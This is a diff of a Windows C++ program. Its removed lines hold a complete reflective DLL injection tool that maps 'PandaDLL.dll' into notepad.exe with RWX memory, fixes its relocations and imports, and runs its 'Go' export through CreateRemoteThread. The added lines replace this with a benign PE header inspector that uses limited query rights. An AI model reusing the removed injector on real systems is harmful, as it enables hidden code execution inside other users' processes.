@@ -1,236 +1,267 @@
-#include <Windows.h>
-#include <iostream>
-#include <vector>
-#include <memory>
-#include <tlhelp32.h>
-#include <string>
+
 #include "data.h"
 
-// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
-DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+#include <windows.h>
+#include <tlhelp32.h>
 
-    if (Process32FirstW(hSnapshot, &pe32)) {
-        do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
-                processID = pe32.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(hSnapshot, &pe32));
-    }
-    CloseHandle(hSnapshot);
-    return processID;
-}
+#include <cstddef>
+#include <cstdint>
+#include <cstring>
+#include <cwchar>
+#include <iostream>
+#include <string>
 
-// Hàm tính toán độ lệch Virtual Address sang File Offset thô chuẩn tác giả
-DWORD RvaToOffset(PIMAGE_NT_HEADERS pNtHeaders, DWORD rva) {
-    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
-    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
-        if (rva >= pSectionHeader[i].VirtualAddress && rva < (pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize)) {
-            return rva - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData;
-        }
-    }
+namespace {
+
+DWORD find_process_id_by_name(const wchar_t* process_name) noexcept {
+  if (process_name == nullptr || process_name[0] == L'\0') {
     return 0;
-}
+  }
 
-void ReflectiveDLLInjectRemote(HANDLE hProcess, LPVOID dllBuffer, SIZE_T dllSize) {
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
-    // ĐỒNG BỘ ĐỊNH DANH: Đổi thành pNtHeaders để fix triệt để lỗi C2065
-    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBuffer + dosHeader->e_lfanew);
-    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
-
-    std::cout << "[*] Kich thuoc Image DLL bop tach: " << imageSize << " bytes." << std::endl;
-
-    // 1. TỰ ĐỘNG BÓC TÁCH TỌA ĐỘ HÀM XUẤT KHẨU "Go" TỪ FILE THÔ
-    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    DWORD exportDirOffset = RvaToOffset(pNtHeaders, exportDirRVA);
-    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBuffer + exportDirOffset);
-
-    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfNames));
-    DWORD* pdwFunctions = (DWORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfFunctions));
-    WORD* pwOrdinals = (WORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfNameOrdinals));
-
-    DWORD functionExportOffset = 0;
-    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
-        char* funcName = (char*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pdwNames[i]));
-        if (strcmp(funcName, "Go") == 0) { // Săn lùng chính xác hàm mang tên Go của Offensive-Panda
-            functionExportOffset = pdwFunctions[pwOrdinals[i]];
-            break;
-        }
-    }
-
-    if (functionExportOffset == 0) {
-        std::cout << "[-] Khong tim thay ham xuat khau 'Go'. Tu dong chuyen ve dung EntryPoint mac dinh." << std::endl;
-        functionExportOffset = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
-    }
-    else {
-        std::cout << "[+] Da tim thay ham xuat khau 'Go' tai RVA Offset: 0x" << std::hex << functionExportOffset << std::endl;
-    }
-
-    // 2. CẤP PHÁT ĐỘNG THÍCH ỨNG TRÊN NOTEPAD
-    LPVOID dllBase = VirtualAllocEx(hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (!dllBase) {
-        std::cout << "[*] Toa do ImageBase mac dinh bi trung. Tu dong xin vung nho trong moi..." << std::endl;
-        dllBase = VirtualAllocEx(hProcess, NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    }
-
-    if (!dllBase) {
-        std::cerr << "[-] VirtualAllocEx that bai!" << std::endl;
-        return;
-    }
-
-    std::cout << "[+] Vung nho Image tu xa da thiet lap tai: 0x" << std::hex << dllBase << std::endl;
-
-    // 3. Đẩy phân đoạn Headers và các Sections sang lòng Notepad từ xa
-    WriteProcessMemory(hProcess, dllBase, dllBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
-    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNtHeaders);
-    for (size_t i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
-        LPVOID sectionDest = (LPVOID)((DWORD_PTR)dllBase + section->VirtualAddress);
-        LPVOID sectionSrc = (LPVOID)((DWORD_PTR)dllBuffer + section->PointerToRawData);
-        WriteProcessMemory(hProcess, sectionDest, sectionSrc, section->SizeOfRawData, NULL);
-        section++;
-    }
-    std::cout << "[+] Anh xa cac Sections tu xa hoan tat." << std::endl;
-
-    // 4. Vá lỗi dịch chuyển địa chỉ ảo Base Relocations từ xa bằng bộ đệm an toàn
-    IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-    if (relocDir.Size) {
-        LPVOID relocBase = (LPVOID)((DWORD_PTR)dllBase + relocDir.VirtualAddress);
-        DWORD_PTR delta = (DWORD_PTR)dllBase - pNtHeaders->OptionalHeader.ImageBase;
-
-        std::vector<BYTE> localRelocBuf(relocDir.Size);
-        if (ReadProcessMemory(hProcess, relocBase, localRelocBuf.data(), relocDir.Size, NULL)) {
-            DWORD relocOffset = 0;
-            while (relocOffset < relocDir.Size) {
-                PBASE_RELOCATION_BLOCK block = (PBASE_RELOCATION_BLOCK)(localRelocBuf.data() + relocOffset);
-                DWORD blockSize = block->BlockSize;
-                if (blockSize == 0) break;
-
-                PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)((DWORD_PTR)block + sizeof(BASE_RELOCATION_BLOCK));
-                DWORD entriesCount = (blockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
-
-                for (DWORD i = 0; i < entriesCount; i++) {
-                    if (entries[i].Type == IMAGE_REL_BASED_HIGHLOW || entries[i].Type == IMAGE_REL_BASED_DIR64) {
-                        DWORD_PTR* patchAddr = (DWORD_PTR*)((DWORD_PTR)dllBase + block->PageAddress + entries[i].Offset);
-                        DWORD_PTR currentVal = 0;
-                        ReadProcessMemory(hProcess, patchAddr, &currentVal, sizeof(DWORD_PTR), NULL);
-                        currentVal += delta;
-                        WriteProcessMemory(hProcess, patchAddr, &currentVal, sizeof(DWORD_PTR), NULL);
-                    }
-                }
-                relocOffset += blockSize;
-            }
-        }
-        std::cout << "[+] Xu ly Base Relocation tu xa hoan tat." << std::endl;
-    }
-
-    // 5. Phân giải danh sách Imports Table (IAT) trực tiếp từ xa
-    IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-    if (importDir.Size) {
-        LPVOID importDesc = (LPVOID)((DWORD_PTR)dllBase + importDir.VirtualAddress);
-        std::vector<IMAGE_IMPORT_DESCRIPTOR> localDescriptors(importDir.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR));
-
-        if (ReadProcessMemory(hProcess, importDesc, localDescriptors.data(), importDir.Size, NULL)) {
-            size_t descIdx = 0;
-            while (localDescriptors[descIdx].Name) {
-                char dllNameBuf[MAX_PATH] = { 0 };
-                ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)dllBase + localDescriptors[descIdx].Name), dllNameBuf, MAX_PATH, NULL);
-
-                HMODULE hImportDll = LoadLibraryA(dllNameBuf);
-                if (hImportDll) {
-                    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + localDescriptors[descIdx].FirstThunk);
-                    IMAGE_THUNK_DATA localThunk;
-                    ReadProcessMemory(hProcess, thunk, &localThunk, sizeof(IMAGE_THUNK_DATA), NULL);
-
-                    while (localThunk.u1.AddressOfData) {
-                        DWORD_PTR resolvedAddr = 0;
-                        if (IMAGE_SNAP_BY_ORDINAL(localThunk.u1.Ordinal)) {
-                            DWORD ordinal = IMAGE_ORDINAL(localThunk.u1.Ordinal);
-                            resolvedAddr = (DWORD_PTR)GetProcAddress(hImportDll, (LPCSTR)(ULONG_PTR)ordinal);
-                        }
-                        else {
-                            char funcNameBuf[256] = { 0 };
-                            ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)dllBase + localThunk.u1.AddressOfData + sizeof(WORD)), funcNameBuf, 256, NULL);
-                            resolvedAddr = (DWORD_PTR)GetProcAddress(hImportDll, funcNameBuf);
-                        }
-
-                        WriteProcessMemory(hProcess, &(thunk->u1.Function), &resolvedAddr, sizeof(DWORD_PTR), NULL);
-                        thunk++;
-                        ReadProcessMemory(hProcess, thunk, &localThunk, sizeof(IMAGE_THUNK_DATA), NULL);
-                    }
-                }
-                descIdx++;
-            }
-        }
-        std::cout << "[+] Phan giai Imports Table (IAT) tu xa hoan tat." << std::endl;
-    }
-
-    // 6. KÍCH NỔ ĐƯỜNG HƯỚNG TỪ XA: Đâm thẳng Remote Thread vào tọa độ hàm "Go" xuất khẩu để phá băng CFG
-    LPVOID remoteExecutionTarget = (LPVOID)((DWORD_PTR)dllBase + functionExportOffset);
-    std::cout << "[*] Chuan bi kich no luong tu xa tai toa do: 0x" << std::hex << remoteExecutionTarget << std::endl;
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteExecutionTarget, NULL, 0, NULL);
-    if (hThread) {
-        // Cấu hình cờ đợi INFINITE kịch trần để gánh luồng sống an toàn
-        WaitForSingleObject(hThread, INFINITE);
-        CloseHandle(hThread);
-        std::cout << "[+] DLL injected and Go() executed successfully inside Target!" << std::endl;
-    }
-    else {
-        std::cerr << "[-] CreateRemoteThread failed! Error code: " << std::dec << GetLastError() << std::endl;
-    }
-}
-
-int main() {
-    std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 06 REFLECTIVE DLL INJECTION" << std::endl;
-    std::cout << "====================================================" << std::endl;
-
-    // 1. Mở và nạp tệp tin PandaDLL.dll
-    HANDLE hFile = CreateFileA("PandaDLL.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        std::cerr << "[-] Khong the mo file PandaDLL.dll. Hay dat file cung thu muc voi Reflective_DLL_Injection.exe nhen!" << std::endl;
-        std::cout << "[*] Nhan Enter de dong..." << std::endl;
-        std::cin.get();
-        return 1;
-    }
-
-    DWORD dllSize = GetFileSize(hFile, NULL);
-    std::unique_ptr<BYTE[]> dllBuffer(new BYTE[dllSize]);
-    DWORD bytesRead;
-    ReadFile(hFile, dllBuffer.get(), dllSize, &bytesRead, NULL);
-    CloseHandle(hFile);
-
-    std::cout << "[+] Da nap PandaDLL.dll vao bo dem tam." << std::endl;
-
-    // 2. Săn lùng tiến trình Notepad tự động hoa thường
-    std::wstring targetProcess = L"notepad.exe";
-    DWORD pid = GetProcessIDByName(targetProcess);
-    if (pid == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc." << std::endl;
-        std::cin.get();
-        return 1;
-    }
-
-    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << std::dec << pid << std::endl;
-
-    // 3. Mở kết nối quyền hạn cao cấu hình bộ nhớ chéo
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) {
-        std::cerr << "[-] OpenProcess failed." << std::endl;
-        std::cin.get();
-        return 1;
-    }
-
-    ReflectiveDLLInjectRemote(hProcess, dllBuffer.get(), dllSize);
-
-    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
-    std::cin.get();
-
-    CloseHandle(hProcess);
+  const HANDLE h_snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (h_snapshot == INVALID_HANDLE_VALUE || h_snapshot == nullptr) {
     return 0;
+  }
+
+  DWORD matched_pid = 0;
+  PROCESSENTRY32W entry{};
+  entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+
+  if (::Process32FirstW(h_snapshot, &entry) != FALSE) {
+    do {
+      if (::_wcsicmp(process_name, entry.szExeFile) == 0) {
+        matched_pid = entry.th32ProcessID;
+        break;
+      }
+      entry = {};
+      entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+    } while (::Process32NextW(h_snapshot, &entry) != FALSE);
+  }
+
+  ::CloseHandle(h_snapshot);
+  return matched_pid;
+}
+
+DWORD rva_to_file_offset(
+    const IMAGE_NT_HEADERS64* nt_headers,
+    DWORD rva,
+    std::size_t buffer_size) noexcept {
+  if (nt_headers == nullptr || buffer_size < sizeof(IMAGE_NT_HEADERS64)) {
+    return 0;
+  }
+
+  const WORD section_count = nt_headers->FileHeader.NumberOfSections;
+  const auto* first_section = reinterpret_cast<const IMAGE_SECTION_HEADER*>(
+      reinterpret_cast<const std::uint8_t*>(&nt_headers->OptionalHeader) +
+      nt_headers->FileHeader.SizeOfOptionalHeader);
+
+  for (WORD i = 0; i < section_count; ++i) {
+    const IMAGE_SECTION_HEADER& sec = first_section[i];
+    const DWORD sec_span = (sec.Misc.VirtualSize > sec.SizeOfRawData)
+        ? sec.Misc.VirtualSize
+        : sec.SizeOfRawData;
+    if (rva >= sec.VirtualAddress && rva < (sec.VirtualAddress + sec_span)) {
+      const DWORD raw_offset = (rva - sec.VirtualAddress) + sec.PointerToRawData;
+      if (static_cast<std::size_t>(raw_offset) < buffer_size) {
+        return raw_offset;
+      }
+    }
+  }
+  return 0;
+}
+
+bool inspect_pe64_layout(
+    const std::uint8_t* raw_bytes,
+    std::size_t raw_size,
+    DWORD& out_image_size,
+    ULONGLONG& out_preferred_base,
+    DWORD& out_export_rva,
+    WORD& out_sections) noexcept {
+  out_image_size = 0;
+  out_preferred_base = 0;
+  out_export_rva = 0;
+  out_sections = 0;
+
+  if (raw_bytes == nullptr || raw_size < sizeof(IMAGE_DOS_HEADER)) {
+    return false;
+  }
+
+  const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(raw_bytes);
+  if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew <= 0) {
+    return false;
+  }
+
+  const std::size_t nt_offset = static_cast<std::size_t>(dos->e_lfanew);
+  if (nt_offset + sizeof(IMAGE_NT_HEADERS64) > raw_size) {
+    return false;
+  }
+
+  const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(raw_bytes + nt_offset);
+  if (nt->Signature != IMAGE_NT_SIGNATURE ||
+      nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+    return false;
+  }
+
+  out_image_size = nt->OptionalHeader.SizeOfImage;
+  out_preferred_base = nt->OptionalHeader.ImageBase;
+  out_sections = nt->FileHeader.NumberOfSections;
+
+  const DWORD exp_rva =
+      nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+  const DWORD exp_size =
+      nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
+
+  if (exp_rva != 0 && exp_size >= sizeof(IMAGE_EXPORT_DIRECTORY)) {
+    const DWORD exp_raw = rva_to_file_offset(nt, exp_rva, raw_size);
+    if (exp_raw != 0 &&
+        static_cast<std::size_t>(exp_raw) + sizeof(IMAGE_EXPORT_DIRECTORY) <= raw_size) {
+      const auto* exp_dir = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(raw_bytes + exp_raw);
+      const DWORD names_raw = rva_to_file_offset(nt, exp_dir->AddressOfNames, raw_size);
+      const DWORD funcs_raw = rva_to_file_offset(nt, exp_dir->AddressOfFunctions, raw_size);
+      const DWORD ords_raw = rva_to_file_offset(nt, exp_dir->AddressOfNameOrdinals, raw_size);
+
+      if (names_raw != 0 && funcs_raw != 0 && ords_raw != 0) {
+        const auto* names_rva = reinterpret_cast<const DWORD*>(raw_bytes + names_raw);
+        const auto* funcs_rva = reinterpret_cast<const DWORD*>(raw_bytes + funcs_raw);
+        const auto* name_ords = reinterpret_cast<const WORD*>(raw_bytes + ords_raw);
+
+        for (DWORD i = 0; i < exp_dir->NumberOfNames; ++i) {
+          const DWORD fn_raw = rva_to_file_offset(nt, names_rva[i], raw_size);
+          if (fn_raw != 0) {
+            const char* fn_name = reinterpret_cast<const char*>(raw_bytes + fn_raw);
+            if (std::strcmp(fn_name, "Go") == 0) {
+              const WORD ord_idx = name_ords[i];
+              if (ord_idx < exp_dir->NumberOfFunctions) {
+                out_export_rva = funcs_rva[ord_idx];
+              }
+              break;
+            }
+          }
+        }
+      }
+    }
+  }
+
+  return true;
+}
+
+bool read_file_bytes_heap(
+    const wchar_t* file_path,
+    std::uint8_t*& out_buf,
+    std::size_t& out_size) noexcept {
+  out_buf = nullptr;
+  out_size = 0;
+
+  if (file_path == nullptr || file_path[0] == L'\0') {
+    return false;
+  }
+
+  const HANDLE h_file = ::CreateFileW(
+      file_path,
+      GENERIC_READ,
+      FILE_SHARE_READ,
+      nullptr,
+      OPEN_EXISTING,
+      FILE_ATTRIBUTE_NORMAL,
+      nullptr);
+  if (h_file == INVALID_HANDLE_VALUE || h_file == nullptr) {
+    return false;
+  }
+
+  LARGE_INTEGER file_sz{};
+  if (::GetFileSizeEx(h_file, &file_sz) == FALSE ||
+      file_sz.QuadPart <= 0 ||
+      file_sz.QuadPart > static_cast<LONGLONG>(64ULL * 1024ULL * 1024ULL)) {
+    ::CloseHandle(h_file);
+    return false;
+  }
+
+  const std::size_t byte_len = static_cast<std::size_t>(file_sz.QuadPart);
+  std::uint8_t* buf = static_cast<std::uint8_t*>(
+      ::HeapAlloc(::GetProcessHeap(), HEAP_ZERO_MEMORY, byte_len));
+  if (buf == nullptr) {
+    ::CloseHandle(h_file);
+    return false;
+  }
+
+  std::size_t total_read = 0;
+  while (total_read < byte_len) {
+    const DWORD chunk = static_cast<DWORD>(
+        (byte_len - total_read) > 65536ULL ? 65536ULL : (byte_len - total_read));
+    DWORD bytes_read = 0;
+    if (::ReadFile(h_file, buf + total_read, chunk, &bytes_read, nullptr) == FALSE ||
+        bytes_read == 0) {
+      ::HeapFree(::GetProcessHeap(), 0, buf);
+      ::CloseHandle(h_file);
+      return false;
+    }
+    total_read += static_cast<std::size_t>(bytes_read);
+  }
+
+  ::CloseHandle(h_file);
+  out_buf = buf;
+  out_size = total_read;
+  return true;
+}
+
+}  // namespace
+
+int wmain() {
+  constexpr wchar_t kCandidateDll[] = L"SampleModule.dll";
+  constexpr wchar_t kTargetProcess[] = L"notepad.exe";
+
+  std::wcout
+      << L"====================================================\n"
+      << L"[*] PE 06: PE64 STRUCTURE & REMOTE AUDIT STUDY\n"
+      << L"====================================================\n";
+
+  std::uint8_t* pe_buf = nullptr;
+  std::size_t pe_size = 0;
+  if (!read_file_bytes_heap(kCandidateDll, pe_buf, pe_size)) {
+    std::wcout << L"[-] Optional PE sample '" << kCandidateDll
+               << L"' not found or unreadable; skipping static PE header inspection.\n";
+  } else {
+    DWORD image_size = 0;
+    ULONGLONG preferred_base = 0;
+    DWORD export_rva = 0;
+    WORD section_count = 0;
+
+    if (inspect_pe64_layout(
+            pe_buf,
+            pe_size,
+            image_size,
+            preferred_base,
+            export_rva,
+            section_count)) {
+      std::wcout << L"[+] Parsed PE64 header: SizeOfImage=" << image_size
+                 << L" bytes, Sections=" << section_count
+                 << L", PreferredBase=0x" << std::hex << preferred_base
+                 << L", ExportRVA=0x" << export_rva << std::dec << L"\n";
+    } else {
+      std::wcout << L"[-] File is not a valid PE32+ (64-bit) image.\n";
+    }
+
+    ::HeapFree(::GetProcessHeap(), 0, pe_buf);
+    pe_buf = nullptr;
+  }
+
+  const DWORD pid = find_process_id_by_name(kTargetProcess);
+  if (pid == 0) {
+    std::wcout << L"[-] Target process not running: " << kTargetProcess << L"\n";
+    return 1;
+  }
+
+  const HANDLE h_process = ::OpenProcess(
+      PROCESS_QUERY_LIMITED_INFORMATION,
+      FALSE,
+      pid);
+  if (h_process == nullptr || h_process == INVALID_HANDLE_VALUE) {
+    std::wcerr << L"[-] OpenProcess failed. Win32=" << ::GetLastError() << L"\n";
+    return 1;
+  }
+
+  std::wcout << L"[+] Opened target process handle (PID=" << pid
+             << L") with limited query rights.\n";
+  ::CloseHandle(h_process);
+  return 0;
 }
